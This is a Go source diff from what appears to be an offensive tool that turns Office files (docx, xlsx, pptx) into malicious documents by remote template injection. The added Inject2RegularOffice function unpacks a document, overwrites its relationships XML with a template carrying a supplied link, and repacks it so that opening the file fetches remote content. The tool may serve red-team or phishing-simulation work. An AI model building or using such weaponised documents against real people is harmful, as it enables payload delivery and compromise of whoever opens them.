@@ -30,13 +30,13 @@ func Inject2Template(fileType string, input string, output string, link string) 
 	logger := log.New(os.Stderr, "[!] ", 0)
 	switch fileType {
 	case "docx":
-		// Call function named Inject2TemplateDocx
+		// Call function named Inject2TemplateOffice
 		Inject2TemplateOffice(input, output, link, "docx")
 	case "xlsx":
-		// Call function named Inject2TemplateXlsx
+		// Call function named Inject2TemplateOffice
 		Inject2TemplateOffice(input, output, link, "xlsx")
 	case "pptx":
-		// Call function named Inject2TemplatePptx
+		// Call function named Inject2TemplateOffice
 		Inject2TemplateOffice(input, output, link, "pptx")
 	default:
 		logger.Fatal("The file type is not supported.")
@@ -48,14 +48,14 @@ func Inject2Regular(fileType string, input string, output string, link string) {
 	logger := log.New(os.Stderr, "[!] ", 0)
 	switch fileType {
 	case "docx":
-		// Call function named Inject2TemplateDocx
-		//Inject2TemplateOffice(input, output, link, "docx")
+		// Call function named Inject2RegularOffice
+		Inject2RegularOffice(input, output, link, "docx")
 	case "xlsx":
-		// Call function named Inject2TemplateXlsx
-		//Inject2TemplateOffice(input, output, link, "xlsx")
+		// Call function named Inject2RegularOffice
+		Inject2RegularOffice(input, output, link, "xlsx")
 	case "pptx":
-		// Call function named Inject2TemplatePptx
-		//Inject2TemplateOffice(input, output, link, "pptx")
+		// Call function named Inject2RegularOffice
+		Inject2RegularOffice(input, output, link, "pptx")
 	default:
 		logger.Fatal("The file type is not supported.")
 	}
@@ -72,11 +72,11 @@ func Inject2TemplateOffice(input string, output string, link string, statement s
 	// Call function named CreateBackup
 	Converters.CreateBackup(input)
 
-	// Rename the .docx file to .zip
-	zipArchive := input + ".zip"
-
 	// Record the start time
 	CreationStartTime := time.Now()
+
+	// Rename the file to .zip
+	zipArchive := input + ".zip"
 
 	err := os.Rename(input, zipArchive)
 	if err != nil {
@@ -149,4 +149,87 @@ func Inject2TemplateOffice(input string, output string, link string, statement s
 	output = Utils.GetAbsolutePath(output)
 
 	fmt.Printf("[+] MS Office template document successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(output), CreationDuration)
+}
+
+// Inject2RegularOffice function
+func Inject2RegularOffice(input string, output string, link string, statement string) {
+	logger := log.New(os.Stderr, "[!] ", 0)
+
+	// Declare variables
+	var xmlFilePath string
+	var template string
+
+	// Call function named CreateBackup
+	Converters.CreateBackup(input)
+
+	// Record the start time
+	CreationStartTime := time.Now()
+
+	// Rename the file to .zip
+	zipArchive := input + ".zip"
+
+	err := os.Rename(input, zipArchive)
+	if err != nil {
+		logger.Fatal("Error: ", err)
+	}
+
+	// Call function named RemoveExtension
+	folderName := Converters.RemoveExtension(input)
+
+	// Extract the contents of the .docx file to the folder
+	if err := Converters.Unzip(zipArchive, folderName); err != nil {
+		logger.Fatal("Error: ", err)
+	}
+
+	// Remove the original zip archive
+	if err := os.Remove(zipArchive); err != nil {
+		logger.Fatal("Error: ", err)
+	}
+
+	switch statement {
+	case "docx":
+		xmlFilePath = folderName + "\\word\\_rels\\settings.xml.rels"
+		template = xmlWordTemplate
+	case "xlsx":
+		xmlFilePath = folderName + "\\xl\\_rels\\workbook.xml.rels"
+		template = xmlXLTemplate
+	case "pptx":
+		xmlFilePath = folderName + "\\ppt\\_rels\\presentation.xml.rels"
+		template = xmlPPTTemplate
+	default:
+		logger.Fatal("The file type is not supported.")
+	}
+
+	// Create a new file and write the template with the target value
+	err = ioutil.WriteFile(xmlFilePath, []byte(fmt.Sprintf(template, link)), 0644)
+	if err != nil {
+		logger.Fatal("Error: ", err)
+	}
+
+	// Call function named CreateZipArchive
+	Converters.CreateZipArchive(folderName, zipArchive)
+
+	// Remove the folder
+	if err := os.RemoveAll(folderName); err != nil {
+		logger.Fatal("Error: ", err)
+	}
+
+	// Record the end time
+	CreationEndTime := time.Now()
+
+	// Calculate the duration
+	CreationDuration := CreationEndTime.Sub(CreationStartTime)
+
+	if input != output {
+		// Call function named SetOutput
+		Output.SetOutput(zipArchive, output)
+	} else {
+		// Call function named SetOutput
+		Output.SetOutput(zipArchive, input)
+	}
+
+	// Call function named GetAbsolutePath
+	output = Utils.GetAbsolutePath(output)
+
+	fmt.Printf("[+] Regular MS Office document successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(output), CreationDuration)
 }
